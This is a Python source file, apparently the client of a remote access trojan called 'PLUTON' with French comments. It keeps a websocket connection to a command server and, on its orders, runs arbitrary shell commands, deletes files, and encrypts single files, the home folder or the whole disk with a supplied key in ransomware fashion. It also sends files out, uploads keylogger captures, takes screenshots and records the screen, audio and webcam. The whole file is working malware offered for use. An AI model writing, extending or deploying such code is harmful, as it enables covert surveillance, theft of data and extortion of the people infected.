import subprocess
import os
import sys
import websockets
import json
import asyncio
import platform
from pathlib import Path
import shlex, base64
from .k import run_k
from .webcam import record_webcam
from .os_nav import rm, encrypt_file, decrypt_file, chiff_all, home_user_only, send_file
import requests
from .live import record_screen_with_audio, screen_shoot

cwd = os.getcwd()

# --- CHARGEMENT SÉCURISÉ DE LA CONFIGURATION ---
def get_url():
    default_url = "ws://127.0.0.1:8000/ws/gan"
    try:
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        json_path = os.path.join(base_path, "url.json")
        if os.path.exists(json_path):
            with open(json_path, "r") as f:
                rd = json.load(f)
                return rd.get("url", default_url)
    except Exception as e:
        print(f"Erreur chargement url.json : {e}")
    return default_url

async def send_json(data: dict, ws):
    try:
        await ws.send(json.dumps(data))
        return data
    except json.JSONDecodeError:
        return None

ofh_t = ["ofh", "ofa"]

async def agent():
    global cwd
    asyncio.create_task(run_k())
    
    while True:
        url = get_url()
        try:
            print(f"Tentative de connexion à {url}...")
            async with websockets.connect(url) as ws:
                print("Connecté au serveur avec succès.")
                while True:
                    msg = await ws.recv()
                    try:
                        r = json.loads(msg)
                        tS = r.get("type")

                        if tS == "--cmd":
                            cmd = r.get("cmd")
                            if not cmd:
                                continue
                            if isinstance(cmd, str):
                                cmd = shlex.split(cmd)

                            if cmd[0] == "cd":
                                try:
                                    pat = os.path.expanduser(cmd[1] if len(cmd) > 1 else "~")
                                    os.chdir(pat)
                                    cwd = os.getcwd()
                                    fr = cwd
                                except Exception as e:
                                    fr = f"cd error: {str(e)}"
                            else:
                                res = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=cwd)
                                out, err = res.communicate()
                                fr = out + err

                            await ws.send(json.dumps({"result": fr}))

                        elif tS == "rm":
                            file = r.get("file")
                            de = rm(file)
                            await ws.send(json.dumps({"result": de}))
                        elif tS == "enc":
                            tpc = r.get("tpc")
                            file = r.get("file")
                            key = r.get("key")
                            b64 = base64.b64decode(key)
                            if not tpc:
                                await ws.send(json.dumps({"result": "tpc not found retry please"}))
                                continue
                            if tpc == "enc":
                                res = await encrypt_file(file, b64)
                                await ws.send(json.dumps({"result": res}))
                            elif tpc == "dec":
                                res = await decrypt_file(file, b64)
                                await ws.send(json.dumps({"result": res}))
                            else:
                                await ws.send(json.dumps({"result": "cle invalid ou une erreur mec"}))
                        elif tS in ofh_t:
                            if tS == "ofa":
                                key = r.get("key")
                                b64 = base64.b64decode(key)
                                if not key:
                                    continue
                                res = await chiff_all(b64)
                                await ws.send(json.dumps({"result": res}))
                            elif tS == "ofh":
                                key = r.get("key")
                                b64 = base64.b64decode(key)
                                cmd_type = r.get("ofh_t")
                                res = await home_user_only(b64, cmd_type)
                                await ws.send(json.dumps({"result": res}))
                        elif tS == "sf":
                            filename = r.get("file")
                            p = Path(filename)
                            if not p.exists():
                                await ws.send(json.dumps({"result": "file name error"}))
                                continue
                            await send_file(filename, ws)
                        elif tS == "stk":
                            if Path("glog.ght").exists():
                                await send_file("glog.ght", ws)
                            else:
                                await ws.send(json.dumps({"result": "Aucun keylogger pour le moment"}))
                        elif tS == "live":
                            duree = r.get("dure", 60)
                            final_file = await record_screen_with_audio(duree=duree)
                            if final_file and Path(final_file).exists():
                                await send_file(final_file, ws)
                                os.remove(final_file)
                            else:
                                await ws.send(json.dumps({"result": "Erreur d'enregistrement live."}))
                        elif tS == "cec":
                            file = screen_shoot()
                            if file and Path(file).exists():
                                await send_file(file, ws)
                                os.remove(file)
                            else:
                                await ws.send(json.dumps({"result": "Erreur de capture mec", "error": "file not found"}))
                        elif tS == "webc":
                            dure = r.get("dure", 60)
                            file = await record_webcam(dure)
                            p = Path(file)
                            if p.exists():
                                await send_file(p, ws)

                    except Exception as e:
                        try:
                            await ws.send(json.dumps({"result": f"error: {str(e)}"}))
                        except:
                            pass

        except (websockets.exceptions.WebSocketException, ConnectionRefusedError, OSError) as e:
            print(f"Connexion échouée ({e}). Nouvelle tentative dans 10 secondes...")
        except Exception as e:
            print(f"Erreur inattendue dans la boucle agent : {e}. Nouvelle tentative dans 10 secondes...")
        
        await asyncio.sleep(10)

def _run_mw():
    import traceback, time
    while True: # boucle de reconnexion
        try:
            print(f"[PLUTON] Tentative connexion à {url}")
            asyncio.run(agent())
        except Exception as e:
            print(f"[PLUTON] Erreur: {e}")
            traceback.print_exc()
            # Ecrit dans un fichier pour l'exe sans console
            try:
                with open(os.path.join(cwd, "pluton.log"), "a") as f:
                    f.write(traceback.format_exc() + "\n")
            except:
                pass
            time.sleep(5) # attend 5s et retente
